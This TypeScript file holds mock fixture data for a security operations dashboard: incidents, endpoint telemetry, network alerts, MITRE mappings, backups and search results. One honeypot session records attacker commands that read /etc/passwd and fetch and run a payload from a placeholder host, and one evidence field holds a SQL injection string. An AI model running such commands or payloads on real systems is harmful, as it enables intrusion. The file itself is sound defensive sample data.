import type {
  OverviewMetrics,
  Incident,
  IncidentDetail,
  Endpoint,
  EndpointDetail,
  NetworkAlert,
  NetworkTraffic,
  HoneypotMetrics,
  HoneypotSession,
  MITRETechnique,
  AIAnalysis,
  EmulationCampaign,
  BackupStatus,
  ReportTemplate,
  SearchResult,
  IdentityEvent,
  ThreatHuntResult,
} from "@/types";

// ============================================================
// OVERVIEW
// ============================================================

export const mockOverview: OverviewMetrics = {
  securityScore: 78,

  totalEndpoints: 128,
  healthyEndpoints: 103,
  warningEndpoints: 14,
  criticalEndpoints: 7,
  offlineEndpoints: 4,

  activeIncidents: 5,
  criticalIncidents: 2,
  highIncidents: 2,

  alertsToday: 247,
  networkAlerts: 38,
  hardwareWarnings: 6,
  honeypotActivity: 91,
};

// ============================================================
// INCIDENTS
// ============================================================

export const mockIncidents: Incident[] = [
  {
    id: "INC-0042",
    title: "Possible Resource Hijacking",
    description:
      "Suspicious GPU utilization and persistence activity detected on a finance workstation.",

    severity: "critical",
    status: "investigating",
    confidence: 94,

    affectedAsset: "FINANCE-PC-021",
    affectedUser: "a.mammadov",
    sourceIp: "185.220.101.42",

    detectionSources: ["CryptoGuard", "Wazuh", "Suricata"],
    mitreTechniques: ["T1053", "T1071", "T1204"],

    assignedTo: "SOC Analyst",

    createdAt: "2026-09-16T20:14:00Z",
    updatedAt: "2026-09-16T20:31:00Z",
  },

  {
    id: "INC-0041",
    title: "SSH Brute Force",
    description:
      "Repeated SSH authentication attempts observed against the Cowrie honeypot.",

    severity: "high",
    status: "open",
    confidence: 97,

    affectedAsset: "COWRIE-01",
    affectedUser: "root",
    sourceIp: "45.83.64.12",

    detectionSources: ["Cowrie", "Suricata"],
    mitreTechniques: ["T1110"],

    createdAt: "2026-09-16T19:42:00Z",
    updatedAt: "2026-09-16T19:55:00Z",
  },

  {
    id: "INC-0040",
    title: "SQL Injection Attempt",
    description:
      "Potential SQL injection payload detected against a DMZ web application.",

    severity: "high",
    status: "contained",
    confidence: 89,

    affectedAsset: "WEB-DMZ-01",
    affectedUser: "www-service",
    sourceIp: "103.21.244.17",

    detectionSources: ["Suricata", "Wazuh"],
    mitreTechniques: ["T1190"],

    createdAt: "2026-09-16T18:12:00Z",
    updatedAt: "2026-09-16T18:46:00Z",
  },

  {
    id: "INC-0039",
    title: "Multiple Authentication Failures",
    description:
      "A domain user generated repeated authentication failures across multiple hosts.",

    severity: "medium",
    status: "investigating",
    confidence: 82,

    affectedAsset: "DC01",
    affectedUser: "helpdesk.user",
    sourceIp: "10.10.10.77",

    detectionSources: ["Wazuh", "Active Directory"],
    mitreTechniques: ["T1110", "T1078"],

    createdAt: "2026-09-16T17:30:00Z",
    updatedAt: "2026-09-16T17:45:00Z",
  },

  {
    id: "INC-0038",
    title: "Suspicious Port Scan",
    description:
      "Sequential TCP connection attempts were detected against multiple DMZ services.",

    severity: "low",
    status: "resolved",
    confidence: 88,

    affectedAsset: "DMZ-NETWORK",
    affectedUser: "N/A",
    sourceIp: "10.10.20.25",

    detectionSources: ["Suricata", "pfSense"],
    mitreTechniques: ["T1046"],

    createdAt: "2026-09-16T16:02:00Z",
    updatedAt: "2026-09-16T16:55:00Z",
  },
];

// ============================================================
// INCIDENT DETAILS
// ============================================================

export const mockIncidentDetail: Record<string, IncidentDetail> = {
  "INC-0042": {
    ...mockIncidents[0],

    timeline: [
      {
        id: "TL-1",
        timestamp: "2026-09-16T20:14:00Z",
        time: "20:14",
        title: "Port Scan Detected",
        description: "Suricata observed reconnaissance traffic.",
        source: "Suricata",
        severity: "medium",
      },
      {
        id: "TL-2",
        timestamp: "2026-09-16T20:16:00Z",
        time: "20:16",
        title: "Authentication Failures",
        description: "Multiple failed authentication events were generated.",
        source: "Wazuh",
        severity: "medium",
      },
      {
        id: "TL-3",
        timestamp: "2026-09-16T20:18:00Z",
        time: "20:18",
        title: "Suspicious Process Started",
        description:
          "Unsigned executable launched from the user temporary directory.",
        source: "CryptoGuard",
        severity: "high",
      },
      {
        id: "TL-4",
        timestamp: "2026-09-16T20:19:00Z",
        time: "20:19",
        title: "High GPU Activity",
        description:
          "GPU utilization remained above 90% while the user was idle.",
        source: "CryptoGuard",
        severity: "high",
      },
      {
        id: "TL-5",
        timestamp: "2026-09-16T20:20:00Z",
        time: "20:20",
        title: "Outbound Connection",
        description:
          "Suspicious process initiated an external network connection.",
        source: "Suricata",
        severity: "critical",
      },
      {
        id: "TL-6",
        timestamp: "2026-09-16T20:21:00Z",
        time: "20:21",
        title: "Persistence Created",
        description: "New scheduled task was created by the process.",
        source: "Wazuh",
        severity: "critical",
      },
    ],

    evidence: [
      {
        type: "Process",
        value: "C:\\Users\\a.mammadov\\AppData\\Local\\Temp\\svhost64.exe",
        description: "Unsigned executable launched from a temporary directory.",
        severity: "critical",
      },
      {
        type: "GPU",
        value: "94%",
        description:
          "Sustained high GPU utilization while the interactive user was idle.",
        severity: "high",
      },
      {
        type: "Persistence",
        value: "Scheduled Task: WindowsUpdateTelemetry",
        description:
          "New scheduled task was created shortly after process execution.",
        severity: "critical",
      },
      {
        type: "Network",
        value: "185.220.101.42:443",
        description:
          "Unexpected outbound connection associated with the suspicious process.",
        severity: "high",
      },
    ],

    relatedAlerts: [
      {
        id: "ALT-901",
        title: "CryptoGuard Resource Warning",
        severity: "high",
        source: "CryptoGuard",
        timestamp: "2026-09-16T20:19:00Z",
        endpointId: "EP-001",
      },
      {
        id: "ALT-902",
        title: "Suspicious Scheduled Task Created",
        severity: "critical",
        source: "Wazuh",
        timestamp: "2026-09-16T20:21:00Z",
        endpointId: "EP-001",
      },
      {
        id: "ALT-903",
        title: "Suspicious Outbound Connection",
        severity: "high",
        source: "Suricata",
        timestamp: "2026-09-16T20:20:00Z",
        sourceIp: "10.10.10.21",
        destinationIp: "185.220.101.42",
      },
    ],

    recommendations: [
      "Validate the executable hash against internal and external threat intelligence.",
      "Review parent/child process relationships.",
      "Inspect scheduled tasks created during the incident window.",
      "Review outbound traffic associated with the suspicious process.",
      "Confirm whether the observed GPU workload is expected for this endpoint.",
    ],

    containmentSteps: [
      "Consider isolating the endpoint after analyst approval.",
      "Block confirmed malicious indicators after validation.",
      "Remove unauthorized persistence after evidence collection.",
      "Reset affected credentials if credential compromise is confirmed.",
    ],
  },

  "INC-0041": {
    ...mockIncidents[1],

    timeline: [
      {
        id: "SSH-1",
        timestamp: "2026-09-16T19:42:00Z",
        time: "19:42",
        title: "SSH Brute Force Started",
        description: "Rapid authentication attempts detected.",
        source: "Cowrie",
        severity: "high",
      },
      {
        id: "SSH-2",
        timestamp: "2026-09-16T19:44:00Z",
        time: "19:44",
        title: "root Login Attempt",
        description: "Attacker attempted common root credentials.",
        source: "Cowrie",
        severity: "high",
      },
    ],

    evidence: [
      {
        type: "Source IP",
        value: "45.83.64.12",
        description: "Source generated repeated SSH login attempts.",
        severity: "high",
      },
    ],

    relatedAlerts: [
      {
        id: "ALT-880",
        title: "Cowrie SSH Brute Force",
        severity: "high",
        source: "Cowrie",
        timestamp: "2026-09-16T19:42:00Z",
      },
    ],

    recommendations: [
      "Review the complete Cowrie session.",
      "Search SIEM telemetry for the source IP.",
    ],

    containmentSteps: [
      "No production containment action required for the isolated honeypot.",
      "Consider blocking the source after validation if observed elsewhere.",
    ],
  },

  "INC-0040": {
    ...mockIncidents[2],

    timeline: [
      {
        id: "SQL-1",
        timestamp: "2026-09-16T18:12:00Z",
        time: "18:12",
        title: "Suspicious HTTP Request",
        description: "Suricata matched a SQL injection signature.",
        source: "Suricata",
        severity: "high",
      },
    ],

    evidence: [
      {
        type: "HTTP Request",
        value: "' OR 1=1 --",
        description: "SQL injection pattern detected in request parameters.",
        severity: "high",
      },
    ],

    relatedAlerts: [
      {
        id: "ALT-870",
        title: "SQL Injection Signature Match",
        severity: "high",
        source: "Suricata",
        timestamp: "2026-09-16T18:12:00Z",
      },
    ],

    recommendations: [
      "Review web application and reverse-proxy logs.",
      "Confirm whether the request reached the application database layer.",
    ],

    containmentSteps: [
      "Block confirmed hostile source indicators after analyst review.",
      "Review application input validation.",
    ],
  },

  "INC-0039": {
    ...mockIncidents[3],
    timeline: [],
    evidence: [],
    relatedAlerts: [],
    recommendations: ["Review domain authentication logs."],
    containmentSteps: ["Validate the account before taking action."],
  },

  "INC-0038": {
    ...mockIncidents[4],
    timeline: [],
    evidence: [],
    relatedAlerts: [],
    recommendations: ["Review the scanning source and scope."],
    containmentSteps: ["No further action required after validation."],
  },
};

// ============================================================
// ENDPOINTS
// ============================================================

export const mockEndpoints: Endpoint[] = [
  {
    id: "EP-001",
    hostname: "FINANCE-PC-021",
    ip: "10.10.10.21",
    user: "a.mammadov",
    os: "Windows 11 Enterprise",

    status: "critical",

    securityRisk: 94,
    hardwareRisk: 68,

    cpu: 72,
    gpu: 94,
    ram: 81,
    agentStatus: "online",

    lastSeen: "2026-09-16T20:31:00Z",
  },

  {
    id: "EP-002",
    hostname: "DESIGN-PC-004",
    ip: "10.10.10.44",
    user: "designer01",
    os: "Windows 11 Pro",

    status: "warning",

    securityRisk: 12,
    hardwareRisk: 57,

    cpu: 91,
    gpu: 96,
    ram: 78,
    agentStatus: "online",

    lastSeen: "2026-09-16T20:29:00Z",
  },

  {
    id: "EP-003",
    hostname: "DC01",
    ip: "10.10.10.10",
    user: "SYSTEM",
    os: "Windows Server 2022",

    status: "healthy",

    securityRisk: 8,
    hardwareRisk: 11,

    cpu: 18,
    gpu: 0,
    ram: 42,
    agentStatus: "online",

    lastSeen: "2026-09-16T20:30:00Z",
  },

  {
    id: "EP-004",
    hostname: "HR-PC-011",
    ip: "10.10.10.31",
    user: "hr.user",
    os: "Windows 11 Enterprise",

    status: "healthy",

    securityRisk: 16,
    hardwareRisk: 9,

    cpu: 22,
    gpu: 4,
    ram: 36,
    agentStatus: "online",

    lastSeen: "2026-09-16T20:28:00Z",
  },
];

export const mockEndpointDetail: Record<string, EndpointDetail> = {
  "EP-001": {
    ...mockEndpoints[0],

    ram: 81,

    cpuTemperature: 76,
    gpuTemperature: 84,
    diskTemperature: 47,

    fanStatus: "Elevated RPM",

    userIdleMinutes: 42,

    networkActivity: "Suspicious outbound TLS connection",
    agentStatus: "online",

    securityRiskReasons: [
      "Unsigned executable launched from Temp",
      "User idle while GPU remained highly utilized",
      "Unexpected outbound connection",
      "New scheduled-task persistence",
    ],

    hardwareRiskReasons: [
      "GPU temperature elevated",
      "Sustained high GPU utilization",
    ],

    processes: [
      {
        pid: 4872,
        parentPid: 1296,
        name: "svhost64.exe",
        parentProcess: "powershell.exe",
        cpu: 38,
        gpu: 89,
        path: "C:\\Users\\a.mammadov\\AppData\\Local\\Temp\\svhost64.exe",
        signed: false,
        networkActivity: "185.220.101.42:443",
        risk: 96,
      },
      {
        pid: 1452,
        name: "explorer.exe",
        cpu: 3,
        gpu: 2,
        path: "C:\\Windows\\explorer.exe",
        signed: true,
        networkActivity: "None",
        risk: 3,
      },
    ],
  },

  "EP-002": {
    ...mockEndpoints[1],

    ram: 78,

    cpuTemperature: 82,
    gpuTemperature: 86,
    diskTemperature: 45,

    fanStatus: "High RPM - normal under render load",

    userIdleMinutes: 1,

    networkActivity: "Normal",

    agentStatus: "online",

    securityRiskReasons: [
      "No suspicious security indicators",
      "High workload matches Blender rendering activity",
    ],

    hardwareRiskReasons: [
      "Sustained high CPU temperature",
      "Sustained high GPU temperature",
    ],

    processes: [
      {
        pid: 6420,
        name: "blender.exe",
        cpu: 88,
        gpu: 95,
        path: "C:\\Program Files\\Blender Foundation\\Blender\\blender.exe",
        signed: true,
        networkActivity: "None",
        risk: 4,
      },
    ],
  },

  "EP-003": {
    ...mockEndpoints[2],

    ram: 42,

    cpuTemperature: 49,
    gpuTemperature: 0,
    diskTemperature: 38,

    fanStatus: "Normal",

    userIdleMinutes: 0,

    networkActivity: "Normal domain services",

    agentStatus: "online",

    securityRiskReasons: ["No current high-confidence suspicious behavior"],
    hardwareRiskReasons: ["Hardware telemetry within normal range"],

    processes: [
      {
        pid: 720,
        name: "lsass.exe",
        cpu: 5,
        gpu: 0,
        path: "C:\\Windows\\System32\\lsass.exe",
        signed: true,
        networkActivity: "Domain authentication",
        risk: 5,
      },
    ],
  },

  "EP-004": {
    ...mockEndpoints[3],

    ram: 36,

    cpuTemperature: 52,
    gpuTemperature: 43,
    diskTemperature: 39,

    fanStatus: "Normal",

    userIdleMinutes: 6,

    networkActivity: "Normal",

    agentStatus: "online",

    securityRiskReasons: ["No suspicious behavior detected"],
    hardwareRiskReasons: ["Hardware telemetry within normal range"],

    processes: [],
  },
};

// ============================================================
// NETWORK
// ============================================================

export const mockNetworkAlerts: NetworkAlert[] = [
  {
    id: "NET-001",
    title: "Possible TCP Port Scan",
    severity: "medium",

    source: "Suricata",

    sourceIp: "10.10.20.25",
    destinationIp: "10.10.30.10",

    protocol: "TCP",
    destinationPort: 443,

    action: "alert",

    timestamp: "2026-09-16T20:05:00Z",
  },

  {
    id: "NET-002",
    title: "Suspicious Outbound TLS Connection",
    severity: "high",

    source: "Suricata",

    sourceIp: "10.10.10.21",
    destinationIp: "185.220.101.42",

    protocol: "TCP",
    destinationPort: 443,

    action: "alert",

    timestamp: "2026-09-16T20:20:00Z",
  },
];

export const mockNetworkTraffic: NetworkTraffic[] = [
  {
    timestamp: "20:00",
    inboundMbps: 48,
    outboundMbps: 17,
    connections: 392,
    blockedConnections: 12,
  },
  {
    timestamp: "20:05",
    inboundMbps: 62,
    outboundMbps: 23,
    connections: 441,
    blockedConnections: 18,
  },
  {
    timestamp: "20:10",
    inboundMbps: 54,
    outboundMbps: 31,
    connections: 417,
    blockedConnections: 9,
  },
  {
    timestamp: "20:15",
    inboundMbps: 71,
    outboundMbps: 42,
    connections: 508,
    blockedConnections: 22,
  },
];

// ============================================================
// HONEYPOT
// ============================================================

export const mockHoneypotMetrics: HoneypotMetrics = {
  attacksToday: 91,
  uniqueAttackers: 26,

  sshAttempts: 684,
  successfulDecoyLogins: 12,

  commandsExecuted: 148,
  filesDownloaded: 7,
};

export const mockHoneypotSessions: HoneypotSession[] = [
  {
    id: "HP-SESSION-001",

    sourceIp: "45.83.64.12",
    username: "root",

    startedAt: "2026-09-16T19:42:00Z",
    durationSeconds: 212,

    severity: "high",

    commands: [
      {
        timestamp: "19:44:10",
        command: "uname -a",
      },
      {
        timestamp: "19:44:22",
        command: "cat /etc/passwd",
      },
      {
        timestamp: "19:45:08",
        command: "wget http://example.invalid/payload",
      },
      {
        timestamp: "19:45:21",
        command: "chmod +x payload",
      },
      {
        timestamp: "19:45:29",
        command: "./payload",
      },
    ],

    downloadedFiles: ["payload"],
  },
];

// ============================================================
// MITRE ATT&CK
// ============================================================

export const mockMitreTechniques: MITRETechnique[] = [
  {
    id: "T1053",
    name: "Scheduled Task/Job",
    tactic: "Persistence",

    description:
      "Scheduled execution mechanism observed in endpoint telemetry.",

    coverage: 88,

    incidentIds: ["INC-0042"],
    detectionSources: ["Wazuh", "CryptoGuard"],
  },

  {
    id: "T1078",
    name: "Valid Accounts",
    tactic: "Defense Evasion / Persistence",

    description: "Use of legitimate account credentials.",

    coverage: 76,

    incidentIds: ["INC-0039"],
    detectionSources: ["Active Directory", "Wazuh"],
  },

  {
    id: "T1046",
    name: "Network Service Discovery",
    tactic: "Discovery",

    description: "Network service and port enumeration activity.",

    coverage: 91,

    incidentIds: ["INC-0038"],
    detectionSources: ["Suricata", "pfSense"],
  },

  {
    id: "T1110",
    name: "Brute Force",
    tactic: "Credential Access",

    description: "Repeated credential guessing activity.",

    coverage: 94,

    incidentIds: ["INC-0041", "INC-0039"],
    detectionSources: ["Cowrie", "Wazuh"],
  },
];

// ============================================================
// AI SOC
// ============================================================

export const mockAIAnalysis: AIAnalysis = {
  id: "AI-DEMO-001",

  query: "Analyze current incident",

  timestamp: "2026-09-16T20:32:00Z",

  confidence: 93,

  summary:
    "The observed combination of an unsigned temporary executable, sustained GPU usage during user idle time, outbound communication, and scheduled-task persistence is consistent with possible unauthorized resource utilization. Further analyst validation is recommended before containment.",

  evidence: [
    "Unsigned executable launched from the user Temp directory.",
    "GPU utilization remained high while the interactive user was idle.",
    "Suspicious outbound network connection observed.",
    "New scheduled-task persistence mechanism created.",
  ],

  riskFactors: [
    "Execution from a temporary user-writable directory",
    "Unsigned executable",
    "Resource use inconsistent with user activity",
    "Persistence creation",
    "External network communication",
  ],

  mitreTechniques: ["T1053", "T1071", "T1204"],

  recommendations: [
    "Validate the process hash.",
    "Review process ancestry.",
    "Inspect persistence artifacts.",
    "Correlate network indicators with SIEM telemetry.",
  ],

  containmentSteps: [
    "Request analyst approval before endpoint isolation.",
    "Block confirmed malicious indicators after validation.",
    "Remove malicious persistence after evidence collection.",
  ],
};

// ============================================================
// IDENTITY
// ============================================================

export const mockIdentityEvents: IdentityEvent[] = [
  {
    id: "ID-001",

    eventType: "Failed Logon Burst",

    user: "helpdesk.user",
    host: "DC01",

    sourceIp: "10.10.10.77",

    severity: "medium",

    description: "Multiple authentication failures within a short interval.",

    timestamp: "2026-09-16T17:30:00Z",
  },

  {
    id: "ID-002",

    eventType: "Privileged Logon",

    user: "domain.admin",
    host: "DC01",

    sourceIp: "10.10.10.15",

    severity: "low",

    description: "Successful privileged interactive logon.",

    timestamp: "2026-09-16T16:55:00Z",
  },
];

// ============================================================
// PURPLE TEAM
// ============================================================

export const mockEmulationCampaigns: EmulationCampaign[] = [
  {
    id: "CALDERA-001",

    name: "Credential Access Validation",

    status: "completed",

    startedAt: "2026-09-15T14:00:00Z",

    techniques: ["T1110", "T1078", "T1059"],

    detectedTechniques: ["T1110", "T1078"],
    missedTechniques: ["T1059"],
  },
];

// ============================================================
// BACKUP
// ============================================================

export const mockBackupStatus: BackupStatus[] = [
  {
    id: "BKP-001",

    system: "DC01",

    status: "healthy",

    lastBackup: "2026-09-16T02:00:00Z",

    restoreReady: true,
    immutable: true,
    protected: true,
  },

  {
    id: "BKP-002",

    system: "SOC-DB",

    status: "healthy",

    lastBackup: "2026-09-16T02:15:00Z",

    restoreReady: true,
    immutable: true,
    protected: true,
  },

  {
    id: "BKP-003",

    system: "WEB-DMZ-01",

    status: "warning",

    lastBackup: "2026-09-15T02:20:00Z",

    restoreReady: true,
    immutable: false,
    protected: true,
  },
];

// ============================================================
// REPORTS
// ============================================================

export const mockReportTemplates: ReportTemplate[] = [
  {
    id: "RPT-001",
    name: "Executive Security Summary",
    description: "High-level security posture for leadership.",
    category: "Executive",
  },

  {
    id: "RPT-002",
    name: "Incident Report",
    description: "Detailed SOC incident investigation report.",
    category: "SOC",
  },

  {
    id: "RPT-003",
    name: "CryptoGuard Risk Report",
    description: "Endpoint security and hardware-risk summary.",
    category: "Endpoint",
  },

  {
    id: "RPT-004",
    name: "MITRE Coverage Report",
    description: "Current ATT&CK detection coverage.",
    category: "Detection Engineering",
  },
];

// ============================================================
// GLOBAL SEARCH
// ============================================================

export const mockSearchResults: SearchResult[] = [
  {
    id: "SEARCH-001",
    type: "endpoint",
    label: "FINANCE-PC-021",
    description: "Critical Windows endpoint - Security Risk 94",
    href: "/endpoints/EP-001",
  },

  {
    id: "SEARCH-002",
    type: "ip",
    label: "185.220.101.42",
    description: "External IP related to INC-0042",
    href: "/incidents/INC-0042",
  },

  {
    id: "SEARCH-003",
    type: "incident",
    label: "INC-0042",
    description: "Possible Resource Hijacking",
    href: "/incidents/INC-0042",
  },

  {
    id: "SEARCH-004",
    type: "process",
    label: "svhost64.exe",
    description: "Unsigned process observed on FINANCE-PC-021",
    href: "/endpoints/EP-001",
  },
];

// ============================================================
// THREAT HUNTING
// ============================================================

export const mockThreatHuntResults: ThreatHuntResult[] = [
  {
    id: "HUNT-001",

    entityType: "process",
    value: "svhost64.exe",

    source: "CryptoGuard",

    severity: "critical",

    timestamp: "2026-09-16T20:18:00Z",

    summary:
      "Unsigned executable from Temp with high GPU utilization and external network activity.",

    relatedIncidentIds: ["INC-0042"],
  },

  {
    id: "HUNT-002",

    entityType: "ip",
    value: "45.83.64.12",

    source: "Cowrie",

    severity: "high",

    timestamp: "2026-09-16T19:42:00Z",

    summary: "Source IP generated repeated SSH authentication attempts.",

    relatedIncidentIds: ["INC-0041"],
  },
];
// Complete the original fixture set without changing existing entity identifiers.
export const mockSnapshotAt = "2026-09-16T20:32:00Z";
export const suspiciousHash =
  "a84d716f23b987e15cdb3a00e69f02d844b62f917a503dea798c140db76e921f";
mockEndpointDetail["EP-001"].securityRiskReasons = [
  "Unsigned executable",
  "Execution from Temp",
  "GPU activity while user idle",
  "Suspicious external connection",
  "Scheduled task persistence",
];
mockEndpointDetail["EP-004"].processes = [
  {
    pid: 3216,
    name: "msedge.exe",
    parentProcess: "explorer.exe",
    cpu: 12,
    gpu: 3,
    path: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    signed: true,
    networkActivity: "Internal HR portal over HTTPS",
    risk: 2,
  },
];
mockIncidentDetail["INC-0042"].evidence.push({
  type: "SHA-256",
  value: suspiciousHash,
  description: "Hash of svhost64.exe collected from FINANCE-PC-021.",
  severity: "critical",
});
for (const id of ["INC-0039", "INC-0038"]) {
  const incident = mockIncidentDetail[id];
  incident.timeline = [
    {
      id: id + "-detected",
      timestamp: incident.createdAt,
      title: incident.title,
      description: incident.description,
      source: incident.detectionSources[0],
      severity: incident.severity,
      category: "detection",
    },
    {
      id: id + "-review",
      timestamp: incident.updatedAt,
      title:
        id === "INC-0038"
          ? "Scan validated and case resolved"
          : "Authentication investigation opened",
      description:
        id === "INC-0038"
          ? "Analyst confirmed an authorized internal scanner."
          : "Account owner validation and domain log review requested.",
      category: "action",
    },
  ];
  incident.evidence = [
    {
      type: "Source IP",
      value: incident.sourceIp,
      description: incident.description,
      severity: incident.severity,
    },
    {
      type: "Account / asset",
      value: incident.affectedUser + " / " + incident.affectedAsset,
      description: "Correlated target from detection telemetry.",
      severity: incident.severity,
    },
  ];
  incident.relatedAlerts = [
    {
      id: id + "-ALT",
      title: incident.title,
      severity: incident.severity,
      source: incident.detectionSources[0],
      timestamp: incident.createdAt,
      sourceIp: incident.sourceIp,
    },
  ];
}
mockNetworkAlerts.push(
  {
    id: "NET-003",
    title: "Blocked SSH brute force",
    severity: "high",
    source: "pfSense",
    sourceIp: "45.83.64.12",
    destinationIp: "10.10.30.10",
    protocol: "TCP",
    destinationPort: 22,
    action: "blocked",
    timestamp: "2026-09-16T19:46:00Z",
  },
  {
    id: "NET-004",
    title: "DNS policy violation",
    severity: "medium",
    source: "pfSense",
    sourceIp: "10.10.10.21",
    destinationIp: "203.0.113.53",
    protocol: "UDP",
    destinationPort: 53,
    action: "blocked",
    timestamp: "2026-09-16T20:22:00Z",
  },
);
mockIdentityEvents.push({
  id: "ID-003",
  eventType: "Account Lockout",
  user: "helpdesk.user",
  host: "DC01",
  sourceIp: "10.10.10.77",
  severity: "high",
  description:
    "Account locked after repeated authentication failures; linked to INC-0039.",
  timestamp: "2026-09-16T17:35:00Z",
});
mockMitreTechniques.push(
  {
    id: "T1071",
    name: "Application Layer Protocol",
    tactic: "Command and Control",
    description:
      "Unexpected outbound TLS associated with suspicious execution.",
    coverage: 82,
    incidentIds: ["INC-0042"],
    detectionSources: ["Suricata"],
  },
  {
    id: "T1204",
    name: "User Execution",
    tactic: "Execution",
    description: "User-context execution correlated with the incident.",
    coverage: 61,
    incidentIds: ["INC-0042"],
    detectionSources: ["Wazuh", "CryptoGuard"],
  },
  {
    id: "T1190",
    name: "Exploit Public-Facing Application",
    tactic: "Initial Access",
    description: "SQL injection attempts against the DMZ application.",
    coverage: 87,
    incidentIds: ["INC-0040"],
    detectionSources: ["Suricata", "Wazuh"],
  },
  {
    id: "T1059",
    name: "Command and Scripting Interpreter",
    tactic: "Execution",
    description:
      "Detection gap identified during the credential access campaign.",
    coverage: 0,
    incidentIds: [],
    detectionSources: [],
  },
);
mockReportTemplates.push(
  {
    id: "RPT-005",
    name: "Endpoint Risk Report",
    description:
      "Endpoint inventory with separate security and hardware scores.",
    category: "Endpoint",
  },
  {
    id: "RPT-006",
    name: "Network Security Report",
    description: "IDS detections, firewall blocks and traffic observations.",
    category: "Network",
  },
);
export const mockAlerts = Object.values(mockIncidentDetail).flatMap(
  (incident) => incident.relatedAlerts,
);
Object.assign(mockOverview, {
  totalEndpoints: mockEndpoints.length,
  healthyEndpoints: mockEndpoints.filter((e) => e.status === "healthy").length,
  warningEndpoints: mockEndpoints.filter((e) => e.status === "warning").length,
  criticalEndpoints: mockEndpoints.filter((e) => e.status === "critical")
    .length,
  offlineEndpoints: mockEndpoints.filter((e) => e.status === "offline").length,
  activeIncidents: mockIncidents.filter(
    (i) => i.status === "open" || i.status === "investigating",
  ).length,
  criticalIncidents: mockIncidents.filter(
    (i) =>
      i.severity === "critical" &&
      (i.status === "open" || i.status === "investigating"),
  ).length,
  highIncidents: mockIncidents.filter(
    (i) =>
      i.severity === "high" &&
      (i.status === "open" || i.status === "investigating"),
  ).length,
  alertsToday: mockAlerts.length,
  networkAlerts: mockNetworkAlerts.length,
  hardwareWarnings: mockEndpoints.filter((e) => (e.hardwareRisk ?? -1) >= 50).length,
});
// Build all six searchable entity types from the same canonical records.
mockSearchResults.splice(0, mockSearchResults.length);
for (const endpoint of mockEndpoints) {
  const href = "/endpoints/" + endpoint.id;
  mockSearchResults.push(
    {
      id: endpoint.id,
      type: "endpoint",
      label: endpoint.hostname,
      description: endpoint.ip + " · " + endpoint.user,
      href,
    },
    {
      id: endpoint.id + "-ip",
      type: "ip",
      label: endpoint.ip,
      description: endpoint.hostname,
      href,
    },
    {
      id: endpoint.id + "-user",
      type: "user",
      label: endpoint.user,
      description: endpoint.hostname,
      href,
    },
  );
  for (const process of mockEndpointDetail[endpoint.id].processes)
    mockSearchResults.push({
      id: endpoint.id + "-" + process.pid,
      type: "process",
      label: process.name,
      description: endpoint.hostname + " · " + process.path,
      href: href + "#processes",
    });
}
for (const incident of mockIncidents) {
  mockSearchResults.push(
    {
      id: incident.id,
      type: "incident",
      label: incident.id,
      description: incident.title + " · " + incident.affectedAsset,
      href: "/incidents/" + incident.id,
    },
    {
      id: incident.id + "-ip",
      type: "ip",
      label: incident.sourceIp,
      description: incident.id + " · " + incident.title,
      href: "/incidents/" + incident.id,
    },
    {
      id: incident.id + "-user",
      type: "user",
      label: incident.affectedUser,
      description: incident.id + " · " + incident.affectedAsset,
      href: "/incidents/" + incident.id,
    },
  );
}
mockSearchResults.push({
  id: "hash-svhost64",
  type: "hash",
  label: suspiciousHash,
  description: "svhost64.exe · FINANCE-PC-021 · SHA-256",
  href: "/incidents/INC-0042",
});
mockThreatHuntResults.splice(
  0,
  mockThreatHuntResults.length,
  ...mockSearchResults.map((result) => {
    const endpoint = mockEndpoints.find((e) => result.href.includes(e.id));
    const incidents = mockIncidents.filter(
      (i) =>
        result.href.includes(i.id) || i.affectedAsset === endpoint?.hostname,
    );
    return {
      id: result.id,
      entityType:
        result.type === "endpoint"
          ? "hostname"
          : result.type === "user"
            ? "username"
            : result.type,
      value: result.label,
      source: incidents[0]?.detectionSources.join(", ") ?? "Endpoint agent",
      severity: incidents[0]?.severity ?? "low",
      timestamp:
        incidents[0]?.createdAt ?? endpoint?.lastSeen ?? mockSnapshotAt,
      summary: result.description,
      relatedIncidentIds: incidents.map((i) => i.id),
      href: result.href,
    };
  }),
);
